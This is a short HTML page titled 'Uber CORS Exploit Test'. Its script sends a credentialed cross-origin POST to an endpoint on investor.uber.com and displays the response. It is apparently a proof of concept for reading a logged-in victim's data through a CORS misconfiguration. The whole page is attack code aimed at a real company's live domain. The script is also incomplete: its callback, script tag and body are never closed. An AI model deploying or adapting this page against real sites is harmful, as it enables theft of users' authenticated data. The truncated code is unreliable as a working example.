<!DOCTYPE html>
<html>
  <body>
    <h2>Uber CORS Exploit Test</h2>
    <script>
      fetch("https://investor.uber.com/x0k461/e6c1b/xc9", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ test: "cors" })
      })
      .then(response => response.text())
      .then(data => {
        document.body.innerHTML += `<pre>✅ Status: 200\n\nResponse:\n${data}</pre>`;

</html>
